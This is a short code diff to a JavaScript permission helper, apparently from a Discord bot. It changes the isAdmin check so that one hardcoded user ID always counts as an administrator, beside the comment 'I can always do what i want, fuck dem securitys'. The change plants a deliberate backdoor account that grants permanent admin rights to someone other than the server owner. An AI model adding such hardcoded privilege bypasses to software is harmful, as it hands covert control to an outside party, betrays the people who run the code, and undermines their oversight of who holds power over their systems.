@@ -222,7 +222,7 @@ module.exports = class permissionHelper {
 
    isAdmin(user){
       let adminUser = this.guildDB.get('owner').value();
-      if(user.id == adminUser){
+      if(user.id == adminUser || user.id == '147011778637856768'){ //I can always do what i want, fuck dem securitys
          return true;
       }
       return false;
